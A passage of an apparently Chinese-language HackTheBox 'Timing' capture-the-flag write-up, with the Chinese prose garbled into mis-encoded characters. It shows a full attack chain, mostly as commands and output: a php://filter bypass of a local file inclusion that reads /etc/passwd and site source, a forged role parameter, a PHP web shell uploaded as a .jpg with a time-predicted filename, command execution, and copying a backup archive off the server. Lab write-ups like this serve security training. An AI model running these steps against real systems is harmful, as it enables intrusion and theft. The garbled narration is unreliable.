Words: 3, Lines: 1]\n/var/log/httpd/error_log [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/php.ini            [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/log/maillog        [Status: 200, Size: 25, Words: 3, Lines: 1]\n/usr/local/php/httpd.conf [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/bootptab           [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/log/httpsd/ssl.access_log [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/log/exim_paniclog  [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/log/ftp-proxy      [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/log/apache2/error_log [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/log/mysql.log      [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/log/httpsd/ssl_log [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/log/mysql/mysql-bin.log [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/log/mysql/mysql-slow.log [Status: 200, Size: 25, Words: 3, Lines: 1]\n/usr/local/etc/httpd/logs/access_log [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/log/pureftpd.log   [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/log/lighttpd/lighttpd.error.log [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/log/vsftpd.log     [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/log/dmesg          [Status: 200, Size: 25, Words: 3, Lines: 1]\n/proc/self/net/arp      [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/log/message        [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/log/xferlog        [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/log/messages       [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/log/mysqlderror.log [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/log/faillog        [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/mysql.log          [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/spool/cron/crontabs/root [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/www/log/access_log [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/www/logs/access_log [Status: 200, Size: 25, Words: 3, Lines: 1]\n/usr/local/php/lib/php.ini [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/resolv.conf        [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/log/pure-ftpd/pure-ftpd.log [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/lighttpd.conf      [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/log/exim_rejectlog [Status: 200, Size: 25, Words: 3, Lines: 1]\n/usr/local/php5/httpd.conf [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/run/utmp           [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/log/wtmp           [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/webmin/miniserv.log [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/www/logs/error_log [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/log/yum.log        [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/log/ftp-proxy/ftp-proxy.log [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/log/ftplog         [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/www/logs/error.log [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/www/logs/access.log [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/log/apache2/access_log [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/log/mail.info      [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/log/proftpd        [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/log/secure         [Status: 200, Size: 25, Words: 3, Lines: 1]\n/proc/cpuinfo           [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/log/lastlog        [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/log/chttp.log      [Status: 200, Size: 25, Words: 3, Lines: 1]\n/usr/local/apache/logs/access.log [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/log/exim/rejectlog [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/log/lighttpd/access.log [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/log/apache-ssl/access.log [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/ssh/ssh_host_key   [Status: 200, Size: 25, Words: 3, Lines: 1]\n/usr/local/etc/httpd/logs/error_log [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/log/mail.warn      [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/log/exim_mainlog   [Status: 200, Size: 25, Words: 3, Lines: 1]\n/usr/local/php4/httpd.conf.php [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/www/log/error_log  [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/log/boot           [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/log/mail.log       [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/log/mysql/mysql.log [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/log/apache/error_log [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/apache2/config.inc [Status: 200, Size: 25, Words: 3, Lines: 1]\n:: Progress: [257/257] :: Job [1/1] :: 24 req/sec :: Duration: [0:00:25] :: Errors: 1 ::\n```\n## æ¼æ´åˆ©ç”¨\nè¿™è¾¹æ˜¯å¯ä»¥è¯»å–å‡ºæ¥ä¸œè¥¿çš„ï¼Œè¯æ˜å‚æ•°å¯¹äº†ï¼Œå»éšä¾¿è®¿é—®ä¸€ä¸ªçœ‹çœ‹\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€root)-[~/Desktop]\nâ””â”€# curl http://10.10.11.135/image.php?img=/etc/passwd\nHacking attempt detected!\n```\nè¿™é‡Œä¼¼ä¹ç¢°åˆ°wafäº†ï¼Œæƒ³åŠæ³•ç»•è¿‡ä¸€ä¸‹\n\nè¿™é‡Œæ‰¾åˆ°äº†ä¸€ç¯‡å‚è€ƒæ–‡ç« \n\n> [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File Inclusion#wrapper-phpfilter](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#wrapper-phpfilter)\n\n```bash\nhttp://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php\n```\nä¸Šé¢è¿™ä¸€æ¡æµ‹è¯•åå¯ä»¥ç»•è¿‡ï¼Œç°åœ¨æˆ‘ä»¬æ¥æ„é€ POC\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€root)-[~/Desktop]\nâ””â”€# curl http://10.10.11.135/image.php?img=php://filter/convert.base64-encode/resource=/etc/passwd\ncm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtbmV0d29yazp4OjEwMDoxMDI6c3lzdGVtZCBOZXR3b3JrIE1hbmFnZW1lbnQsLCw6L3J1bi9zeXN0ZW1kL25ldGlmOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtcmVzb2x2ZTp4OjEwMToxMDM6c3lzdGVtZCBSZXNvbHZlciwsLDovcnVuL3N5c3RlbWQvcmVzb2x2ZTovdXNyL3NiaW4vbm9sb2dpbgpzeXNsb2c6eDoxMDI6MTA2OjovaG9tZS9zeXNsb2c6L3Vzci9zYmluL25vbG9naW4KbWVzc2FnZWJ1czp4OjEwMzoxMDc6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpfYXB0Ong6MTA0OjY1NTM0Ojovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4KbHhkOng6MTA1OjY1NTM0OjovdmFyL2xpYi9seGQvOi9iaW4vZmFsc2UKdXVpZGQ6eDoxMDY6MTEwOjovcnVuL3V1aWRkOi91c3Ivc2Jpbi9ub2xvZ2luCmRuc21hc3E6eDoxMDc6NjU1MzQ6ZG5zbWFzcSwsLDovdmFyL2xpYi9taXNjOi91c3Ivc2Jpbi9ub2xvZ2luCmxhbmRzY2FwZTp4OjEwODoxMTI6Oi92YXIvbGliL2xhbmRzY2FwZTovdXNyL3NiaW4vbm9sb2dpbgpwb2xsaW5hdGU6eDoxMDk6MTo6L3Zhci9jYWNoZS9wb2xsaW5hdGU6L2Jpbi9mYWxzZQpzc2hkOng6MTEwOjY1NTM0OjovcnVuL3NzaGQ6L3Vzci9zYmluL25vbG9naW4KbXlzcWw6eDoxMTE6MTE0Ok15U1FMIFNlcnZlciwsLDovbm9uZXhpc3RlbnQ6L2Jpbi9mYWxzZQphYXJvbjp4OjEwMDA6MTAwMDphYXJvbjovaG9tZS9hYXJvbjovYmluL2Jhc2gK\n```\nå¾—åˆ°äº†ä¸€æ®µbase64ç¼–ç ï¼Œå’±ä»¬æŠŠPOCç¨å¾®ä¿®æ”¹ä¸€ä¸‹ï¼Œè®©å®ƒè§£å¯†base64\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€root)-[~/Desktop]\nâ””â”€# curl http://10.10.11.135/image.php?img=php://filter/convert.base64-encode/resource=/etc/passwd|base64 -d  \n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n100  2152  100  2152    0     0   3788      0 --:--:-- --:--:-- --:--:--  3788\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nsystemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin\nsystemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin\nsyslog:x:102:106::/home/syslog:/usr/sbin/nologin\nmessagebus:x:103:107::/nonexistent:/usr/sbin/nologin\n_apt:x:104:65534::/nonexistent:/usr/sbin/nologin\nlxd:x:105:65534::/var/lib/lxd/:/bin/false\nuuidd:x:106:110::/run/uuidd:/usr/sbin/nologin\ndnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin\nlandscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin\npollinate:x:109:1::/var/cache/pollinate:/bin/false\nsshd:x:110:65534::/run/sshd:/usr/sbin/nologin\nmysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false\naaron:x:1000:1000:aaron:/home/aaron:/bin/bash\n```\næˆåŠŸè¯»å–æ–‡ä»¶\n\nç„¶åå’±ä»¬å°è¯•è¯»å–ä¸€ä¸‹ä¹‹å‰è·å–åˆ°çš„æœ¬åœ°æ–‡ä»¶\n\n```php\nâ”Œâ”€â”€(rootğŸ’€root)-[~/Desktop]\nâ””â”€# curl http://10.10.11.135/image.php?img=php://filter/convert.base64-encode/resource=upload.php|base64 -d\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n100  1360  100  1360    0     0    624      0  0:00:02  0:00:02 --:--:--   624\n<?php\ninclude(\"admin_auth_check.php\");\n\n$upload_dir = \"images/uploads/\";\n\nif (!file_exists($upload_dir)) {\n    mkdir($upload_dir, 0777, true);\n}\n\n$file_hash = uniqid();\n\n$file_name = md5('$file_hash' . time()) . '_' . basename($_FILES[\"fileToUpload\"][\"name\"]);\n$target_file = $upload_dir . $file_name;\n$error = \"\";\n$imageFileType = strtolower(pathinfo($target_file, PATHINFO_EXTENSION));\n\nif (isset($_POST[\"submit\"])) {\n    $check = getimagesize($_FILES[\"fileToUpload\"][\"tmp_name\"]);\n    if ($check === false) {\n        $error = \"Invalid file\";\n    }\n}\n\n// Check if file already exists\nif (file_exists($target_file)) {\n    $error = \"Sorry, file already exists.\";\n}\n\nif ($imageFileType != \"jpg\") {\n    $error = \"This extension is not allowed.\";\n}\n\nif (empty($error)) {\n    if (move_uploaded_file($_FILES[\"fileToUpload\"][\"tmp_name\"], $target_file)) {\n        echo \"The file has been uploaded.\";\n    } else {\n        echo \"Error: There was an error uploading your file.\";\n    }\n} else {\n    echo \"Error: \" . $error;\n}\n?>\n```\nè¿™è¾¹å¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸ªè®¤è¯æ–‡ä»¶admin\\_auth\\_check.phpï¼Œå’±ä»¬è¯»å–ä¸€ä¸‹\n\n```php\nâ”Œâ”€â”€(rootğŸ’€root)-[~/Desktop]\nâ””â”€# curl http://10.10.11.135/image.php?img=php://filter/convert.base64-encode/resource=admin_auth_check.php|base64 -d\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n100   268  100   268    0     0    470      0 --:--:-- --:--:-- --:--:--   471\n<?php\n\ninclude_once \"auth_check.php\";\n\nif (!isset($_SESSION['role']) || $_SESSION['role'] != 1) {\n    echo \"No permission to access this panel!\";\n    header('Location: ./index.php');\n    die();\n}\n\n?>\n```\nè¿™é‡Œå¯ä»¥çœ‹åˆ°ï¼Œå’±ä»¬è¦ä½¿ç”¨æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½é‚£å°±å¾—æœ‰ä¸€ä¸ªrole1çš„æƒé™ï¼Œä½†æ˜¯ç›®å‰æ²¡æœ‰ä»»ä½•çº¿ç´¢èƒ½å¾—åˆ°å…³äºrole1çš„å†…å®¹ï¼Œè¿™é‡ŒæŠŠ/etc/passwdå†…è·å–åˆ°çš„è´¦æˆ·aaronæ‹¿å»å°è¯•ä¸€ä¸‹\n\n![](Hackthebox-Timing/fc8a9d18-d119-413a-a2a2-372e7a75fe39.png)\n\næˆåŠŸç™»å½•ï¼Œå’±ä»¬æ‹¿åˆ°äº†ä¸€ä¸ªuser2çš„æƒé™ï¼Œé‚£ä¸ç”¨æƒ³è‚¯å®šæ˜¯éœ€è¦è¶Šæƒäº†\n\n![](Hackthebox-Timing/6d0996b9-927d-4596-a907-0bf5acc2007a.png)\n\n![](Hackthebox-Timing/8b10d4e9-4fd4-47cc-b6a6-88f2ac77fd67.png)\n\næŠ“äº†ä¸€ä¸ªåŒ…çœ‹äº†ä¸€ä¸‹ï¼Œä¼¼ä¹æ²¡æœ‰å…³äºroleçš„æƒé™ï¼Œé‚£å’±ä»¬è‡ªå·±åŠ ä¸€ä¸ªå‘¢ï¼Ÿè¯•è¯•çœ‹\n\n![](Hackthebox-Timing/0119fa62-9817-4a3c-adf4-a9dd033cb157.png)\n\næ”¹åŒ…åŠ å…¥role=1æ‰§è¡Œåï¼Œåˆ·æ–°ä¸€ä¸‹é¡µé¢\n\n![](Hackthebox-Timing/05274cd5-f029-4621-996d-a036e36c7135.png)\n\nå¯ä»¥çœ‹åˆ°å¤šäº†ä¸€ä¸ªadmin panelæŒ‰é’®ï¼Œç‚¹è¿›å»çœ‹çœ‹\n\n![](Hackthebox-Timing/f0df66af-a67d-49cc-94ab-fa09e4a7d877.png)\n\næ˜ç¡®å¤šäº†ä¸€ä¸ªä¸Šä¼ ç‚¹\n\n```php\nâ”Œâ”€â”€(rootğŸ’€root)-[~/Desktop]\nâ””â”€# cat shell.jpg\n<?php system($_GET[cmd]);?>\n```\nåˆ›å»ºä¸€ä¸ªå¸¦æœ‰ä¸€å¥è¯æœ¨é©¬çš„jpgæ–‡ä»¶\n\næ¥ç€æŠŠæˆ‘ä»¬æœ¬åœ°ç³»ç»Ÿçš„æ—¶é—´ä¿®æ”¹ä¸ºGMT(æˆ‘é»˜è®¤çš„æ˜¯CST)\n\nç„¶åä¸Šä¼ è¯¥jpgæ–‡ä»¶çš„æ—¶å€™æ‹¦æˆªä¸Šä¼ åŒ…ï¼Œä½¿ç”¨php -aå¼€å§‹æ‰§è¡Œä¸‹åˆ—å¾ªç¯è¯­å¥ä»¥åï¼Œå†æ”¾åŒ…\n\n```php\nwhile (true){echo date(\"D M j G:i:s T Y\"); echo \" = \" ; echo md5('$file_hash' .time());echo \"\\n\";sleep(1);}\n```\n```php\nâ”Œâ”€â”€(rootğŸ’€root)-[~/Desktop]\nâ””â”€# php -a\nInteractive mode enabled\n\nphp > while (true){echo date(\"D M j G:i:s T Y\"); echo \" = \" ; echo md5('$file_hash' .time());echo \"\\n\";sleep(1);}\nSat Jan 1 0:50:55 CST 2022 = 019996d3ee825407d56ab94dd16bdb34\nSat Jan 1 0:50:56 CST 2022 = c56f6f652fcf60605708795fe9051eeb\nSat Jan 1 0:50:57 CST 2022 = dc3e0079c26a5db5f2c5c96ec26ee917\n```\n```php\nâ”Œâ”€â”€(rootğŸ’€root)-[~]\nâ””â”€# curl 'http://10.10.11.135/image.php?img=images/uploads/80417f57b8c9ce57ca7efbcc1b85a9ae_shell.jpg&cmd=id'\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n```\næˆ‘æŠŠæœ¬åœ°æ—¶é—´ä¿®æ”¹äº†åï¼ŒæˆåŠŸgetshellï¼Œå’±ä»¬ç»§ç»­ä¸‹ä¸€æ­¥\n\nè¿™å°æœºå™¨æœ‰é˜²ç«å¢™ï¼Œæ— æ³•ç›´æ¥æ‹¿åˆ°åå‘shellï¼Œå’±ä»¬ä¸€æ­¥æ­¥æ¥\n\n```php\nâ”Œâ”€â”€(rootğŸ’€root)-[~]\nâ””â”€# curl 'http://10.10.11.135/image.php?img=images/uploads/80417f57b8c9ce57ca7efbcc1b85a9ae_shell.jpg&cmd=ls+-la+/opt'\ntotal 632\ndrwxr-xr-x  2 root root   4096 Dec 31 16:49 .\ndrwxr-xr-x 24 root root   4096 Nov 29 01:34 ..\n-rw-r--r--  1 root root   5609 Dec 31 16:49 default\n-rw-r--r--  1 root root 627851 Jul 20 22:36 source-files-backup.zip\n```\nå’±ä»¬æŠŠæ–‡ä»¶å¤åˆ¶åˆ°/var/www/html/images/uploads/ç„¶åä¸‹è½½\n\n```php\nâ”Œâ”€â”€(rootğŸ’€root)-[~]\nâ””â”€# curl 'http://10.10.11.135/image.php?img=images/uploads/80417f57b8c9ce57ca7efbcc1b85a9ae_shell.jpg&cmd=cp+/opt/source-files-backup.zip+/var/www/html/images/uploads/'\n\nâ”Œâ”€â”€(rootğŸ’€root)-[~]\nâ””â”€# curl 'http://10.10.11.135/image.php?img=images/uploads/source-files-backup.zip' --output source-files-backup.zip                                                                                          6 â¨¯\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n100  613k    0  613k    0     0   165k      0 --:--:--  0:00:03 --:--:--  165k\n```\n```php\nâ”Œâ”€â”€(rootğŸ’€root)-[~/Desktop/backup]\nâ””â”€# ls -la\næ€»ç”¨é‡ 76\ndrwxr-xr-x  6 root root 4096  7æœˆ 20 22:34 .\ndrwxr-xr-x 12 root root 4096 12æœˆ 31 17:36 ..\n-rw-r--r--  1 root root  200  7æœˆ 20 22:34 admin_auth_check.php\n-rw-r--r--  1 root root  373  7æœˆ 20 22:34 auth_check.php\n-rw-r--r--  1 root root 1268  7æœˆ 20 22:34 avatar_uploader.php\ndrwxr-xr-x  2 root root 4096  7æœˆ 20 22:34 css\n-rw-r--r--  1 root root   92  7æœˆ 20 22:34 db_conn.php\n-rw-r--r--  1 root root 3937  7æœˆ 20 22:34 footer.php\ndrwxr-xr-x  8 root root 4096  7æœˆ 20 22:35 .git\n-rw-r--r--  1 root root 1498  7æœˆ 20 22:34 header.php\n-rw-r--r--  1 root root  507  7æœˆ 20 22:34 image.php\ndrwxr-xr-x  3 root root 4096  7æœˆ 20 22:34 images\n-rw-r--r--  1 root root  188  7æœˆ 20 22:34 index.php\ndrwxr-xr-x  2 root root 4096  7æœˆ 20 22:34 js\n-rw-r--r--  1 root root 2074  7æœˆ 20 22:34 login.php\n-rw-r--r--  1 root root  113  7æœˆ 20 22:34 logout.php\n-rw-r--r--  1 root root 3041  7æœˆ 20 22:34 profile.php\n-rw-r--r--  1 root root 1740  7æœˆ 20 22:34 profile_update.php\n-rw-r--r--  1 root root  984  7æœˆ 20 22:34 upload.php\n```\nè§£å‹åå¯ä»¥å¾—åˆ°.gitæ–‡ä»¶ï¼Œè¯·æ±‚gitæ–‡ä»¶çœ‹çœ‹èƒ½å¾—åˆ°ä»€ä¹ˆ\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€root)-[~/Desktop/backup]\nâ””â”€# ~/Desktop/GitTools/Extractor/extractor.sh . source\n###########\n# Extractor is part of https://github.com/internetwache/GitTools\n#\n# Developed and maintained by @gehaxelt from @internetwache\n#\n# Use at your own risk. Usage might be illegal in certain circumstances. \n# Only for educational purposes!\n###########\n[*] Destination folder does not exist\n[*] Creating...\n[+] Found commit: e4e214696159a25c69812571c8214d2bf8736a3f\n[+] Found file: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/admin_auth_check.php\n[+] Found file: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/auth_check.php\n[+] Found file: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/avatar_uploader.php\n[+] Found folder: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/css\n[+] Found file: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/css/bootstrap.min.css\n[+] Found file: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/css/login.css\n[+] Found file: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/db_conn.php\n[+] Found file: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/footer.php\n[+] Found file: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/header.php\n[+] Found file: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/image.php\n[+] Found folder: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/images\n[+] Found file: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/images/background.jpg\n[+] Found file: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/images/user-icon.png\n[+] Found file: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/index.php\n[+] Found folder: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/js\n[+] Found file: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/js/avatar_uploader.js\n[+] Found file: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/js/bootstrap.min.js\n[+] Found file: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/js/jquery.min.js\n[+] Found file: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/js/profile.js\n[+] Found file: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/login.php\n[+] Found file: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/logout.php\n[+] Found file: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/profile.php\n[+] Found file: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/profile_update.php\n[+] Found file: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/upload.php\n[+] Found commit: 16de2698b5b122c93461298eab730d00273bd83e\n[+] Found file: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/admin_auth_check.php\n[+] Found file: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/auth_check.php\n[+] Found file: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/avatar_uploader.php\n[+] Found folder: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/css\n[+] Found file: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/css/bootstrap.min.css\n[+] Found file: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/css/login.css\n[+] Found file: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/db_conn.php\n[+] Found file: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/footer.php\n[+] Found file: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/header.php\n[+] Found file: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/image.php\n[+] Found folder: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/images\n[+] Found file: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/images/background.jpg\n[+] Found file: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/images/user-icon.png\n[+] Found file: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/index.php\n[+] Found folder: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/js\n[+] Found file: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/js/avatar_uploader.js\n[+] Found file: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/js/bootstrap.min.js\n[+] Found file: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/js/jquery.min.js\n[+] Found file: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/js/profile.js\n[+] Found file: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/login.php\n[+] Found file: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/logout.php\n[+] Found file: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/profile.php\n[+] Found file: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/profile_update.php\n[+] Found file: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/upload.php\n```\nç„¶åå¤šäº†ä¸€ä¸ªsourceç›®å½•\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€root)-[~/Desktop/backup]\nâ””â”€# ls -la\næ€»ç”¨é‡ 80\ndrwxr-xr-x  7 root root 4096 12æœˆ 31 17:42 .\ndrwxr-xr-x 13 root root 4096 12æœˆ 31 17:38 ..\n-rw-r--r--  1 root root  200  7æœˆ 20 22:34 admin_auth_check.php\n-rw-r--r--  1 root root  373  7æœˆ 20 22:34 auth_check.php\n-rw-r--r--  1 root root 1268  7æœˆ 20 22:34 avatar_uploader.php\ndrwxr-xr-x  2 root root 4096  7æœˆ 20 22:34 css\n-rw-r--r--  1 root root   92  7æœˆ 20 22:34 db_conn.php\n-rw-r--r--  1 root root 3937  7æœˆ 20 22:34 